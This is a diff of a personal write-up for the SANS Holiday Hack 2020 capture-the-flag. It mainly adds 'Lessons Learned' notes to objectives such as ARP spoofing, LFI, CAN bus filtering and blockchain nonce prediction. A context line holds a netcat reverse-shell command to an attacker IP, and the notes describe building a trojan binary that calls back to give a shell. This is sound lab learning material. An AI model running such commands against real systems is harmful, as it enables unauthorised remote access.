@@ -86,8 +86,8 @@ When you unwrap the over-wrapped file, what text string is inside the package? T
 - Step 8: "cat package.txt"
 
 
-Lesson Learned |
--------------- |
+Lessons Learned |
+--------------- |
 There may be more public buckets lurking than you realize. And, holy cow, there are lots of ways to compress files!|
 
 # Objective 3: Point-of-Sale Password Recovery
@@ -122,9 +122,9 @@ const SANTA_PASSWORD = 'santapass';
 ~~~
 
 
-Lesson Learned |
--------------- |
-You might thing that a password or source code for an application is unavailable to you, but sometimes it is. You can actually extract files from executables and find interesting artifacts in the process.|
+Lessons Learned |
+--------------- |
+You might think that a password or source code for an application is unavailable to you, but sometimes it is. You can actually extract files from executables and find interesting artifacts in the process.|
 
 # Objective 4: Operate the Santavator
 
@@ -135,6 +135,10 @@ Talk to Pepper Minstix in the entryway to get some hints about the Santavator.
 Got some help from my kid on this one. :) 
 
 ![](screenshots/elevator.png)
+
+Lessons Learned |
+--------------- |
+Problems involving angles and refraction can often be solve many different ways. If you have kids, consult with them on problems like these. If you want them solved quickly, that is.|
 
 # Objective 5: Open HID Lock
 
@@ -151,6 +155,9 @@ Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks 
 	- Needed to wait seconds. I was being boneheaded and trying the door before the 10 seconds was up.
 - Step 6: Go through Santa's secret office and become Santa. Amazing! My badge is now the "KringleCon Black Badge"
 
+Lessons Learned |
+--------------- |
+When something doesn't work right the first time, think about what information you might be missing. Also help files are very help-ful. Don't overlook them. Lastly, it really isn't all that hard to simulate badge authentication! |
 
 # Objective 6: Splunk Challenge
 
@@ -254,6 +261,11 @@ According to x509 certificate events captured by Zeek (formerly Bro), what is th
 - Step 4: Alice says I need to watch Splunk talk.
 	- Passphrase is "Stay Frosty"
 
+Lessons Learned |
+--------------- |
+Atomic Red Team tests provide amazing ways to simulate attacks from the Mitre Attack Framework! This is a really good way to test security tools/controls! |
+
+
 # Objective 7: Solve the Sleight's CAN-D-BUS Problem
 
 Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints.
@@ -285,6 +297,11 @@ Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. 
 ![](screenshots/sleigh-defrosted.png)
 
 It works!
+
+Lessons Learned |
+--------------- |
+Some actions or actuations (like driving a car or sled) might not seem like they are digital in nature, but they are! Also, when looking for troublemakers, it is important to reduce noise as much as possible.|
+
 
 # Objective 8: Broken Tag Generator
 
@@ -362,6 +379,12 @@ Upgrade-Insecure-Requests: 1
 Here's the result!
 
 ![](screenshots/tag-generator-env-response.png)
+
+
+Lessons Learned |
+--------------- |
+Some responses that don't show up in your browser do show up Burp. Also, don't underestimate what files may be available to you through LFI.|
+
 
 # Objective 9: ARP Shenanigans
 
@@ -460,6 +483,11 @@ nc -e /bin/sh [attacking ip] 4444
 - Step 11: Navigate to file contents in question:
 	- "cat *.txt | grep recused" (Looking for the individual who recused themselves from the vote.)
 
+Lesson Learned |
+-------------- |
+It's not really all that hard to spoof an ARP response once you understand some basic concepts. It's not really all that hard to spoof a DNS response once you understand some basic concepts. It's not really all that hard to create a simple Linux binary trojan once you understand some basic concepts. I had done none of these things before Holiday Hack 2020. Getting that binary to do a callback and give me a shell was aweXome! | 
+
+
 # Objective 10: Defeat Fingerprint Sensor
 
 Bypass the Santavator fingerprint sensor. Enter Santa's office without Santa's fingerprint.
@@ -470,6 +498,11 @@ This required going into developer mode in Google Chrome. I saw one spot where t
 
 ![](screenshots/remove-besanta-condition.png)
 
+Lessons Learned | 
+--------------- |
+It never hurts to take a close look at source code to see what sort of basic logic may be alterable in order to improve the functionality of an elevator or website. :) |
+
+
 # Objective 11a: Naughty/Nice List with Blockchain Investigation Part 1 
 
 Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and tools. (Enter just the 16-character hex value of the nonce)
@@ -478,15 +511,9 @@ Even though the chunk of the blockchain that you have ends with block 129996, ca
 
 **Answer:** 57066318f32f729d
 
-- Step 1: Set up docker instance with tools needed to solve this objective.
-- Step 2: Read through and understand naughty_nice.py
-- Step 3: Load up blockchain.dat using this file and dump the nonces.
-- Step 4: The nonces come out at 64 bit integers. We need to either split these or figure out how to use them as is...with the right tool. Currently working with blockchain.py file that I created. Also reading more of naughty_nice.py 
-
-So apparently we need to do the following:
-- Get 312 64bit values.
-- Split them in half, making sure to line up on Endianness.
-- Feed them into the predictor and then put back together.
+- Step 1: Get 312 64bit values. (See blockchain.py script below.)
+- Step 2: Split them in half, making sure to think about Endianness. (See blockchain.py script below.)
+- Step 3: Feed them into the predictor and then put back together, making sure to think about Endianness, whether bits go from big to small or small to big. (See blockchain-get-32.sh script below.)
 
 **blockchain.py**
 
@@ -547,8 +574,12 @@ Here's the final script that retrieves he predicted values:
 
  echo "All Done!"
 
-
 ~~~
+
+Lessons Learned |
+--------------- |
+When it comes to computers, everything is deterministic, including random numbers! Be very careful what assumptions you're making when you're using random numbers to make an application or component more secure! Also, I did not fully understand what 32bit vs. 64bit meant until I did this exercise (you can split a 64bit number in half to make a 32bit number!!), which also helped me explain bits and registers to my 11-year-old. Finally, I had NO concept of Endianness until Holiday Hack 2020. But now I do! |
+
 
 # Objective 11b: Naughty/Nice List with Blockchain Investigation Part 2
 
@@ -637,6 +668,11 @@ full hash:        b10b4a6bd373b61f32f4fd3a0cdfbf84 <--- MD5 after changes
 full hash sha256: fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb <--- SHA256 after changes and answer to objective!
 
 ~~~
+
+Lessons Learned |
+--------------- |
+It is important to seek help with solving a problem once you've hit a wall. MD5 collusions are a thing and they can actually happen, and you can make them happen! Jack should have just been nice instead of trying to hack the naughty/nice blockchain. With PDF documents, there is definitely more than what meets the eye. Make sure you're a hundred percent confident you can recreate current state before you move on to make changes and create a new state that shows some differences and not others. For example, an non-changing MD5 hash and a changing SHA256 hash. |
+
 
 # Challenges:
 	
